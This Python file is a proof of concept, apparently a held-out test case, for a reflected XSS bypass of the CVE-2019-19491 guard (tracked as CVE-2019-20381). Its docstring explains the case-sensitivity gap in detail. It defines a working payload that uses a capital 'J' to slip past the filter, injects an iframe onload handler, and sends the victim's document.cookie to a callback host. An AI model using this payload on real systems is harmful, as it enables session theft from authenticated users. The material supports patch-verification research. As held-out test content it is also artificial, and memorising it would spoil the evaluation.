#!/usr/bin/env python3
"""[HELD-OUT] CVE-2019-20381 residual -- NON-LOWERCASE `Javascript` bypassing the 19491 guard.

This is the SAME reflected-XSS payload as original_poc, differing by EXACTLY ONE character: the
capital `J`. The CVE-2019-19491 fix (V1) uses the CASE-SENSITIVE `strpos($reqURI,'javascript')`,
which only matches the all-lowercase substring. The capitalised token `Javascript` contains no
lowercase `javascript` substring -> the guard does NOT fire -> reqURI survives and is reflected
UNESCAPED into the main-frame `src="..."` (main.tpl `<iframe>` on V1). The `"` closes the src
attribute and an `onload="..."` handler is appended to that iframe; on load it fires a beacon that
reads document.cookie in the authenticated victim's origin and exfiltrates the flag on V1 -- the SAME
sink the lowercase seed hit, reached through the case-sensitivity gap the fix never closed. (onload
is scheme-independent, so it executes despite the `$_SESSION['basehref']` prepend that would
neutralise a bare `Javascript:` scheme.)

V2 (=CVE-2019-20381 fix cde692895) replaces `strpos` with case-insensitive `stripos` -> the
capitalised token is caught too -> reqURI blanked to mainPage.php -> nothing injected -> residual
BLOCKED on V2.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from poc_common import run_payload, CB  # noqa: E402

# Capital 'J' -> no lowercase 'javascript' substring -> passes strpos on V1, caught by stripos on V2.
# Byte-for-byte identical to ORIGINAL_PAYLOAD except the leading 'j' -> 'J'.
BYPASS_PAYLOAD = 'Javascript" onload="new Image().src=\'' + CB + "'+document.cookie"


def bypass_poc(*, version="v1"):
    """Run the CVE2 residual on `version`; returns the callback dump (flag present on V1)."""
    return run_payload(BYPASS_PAYLOAD, version)


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(bypass_poc(version=v))
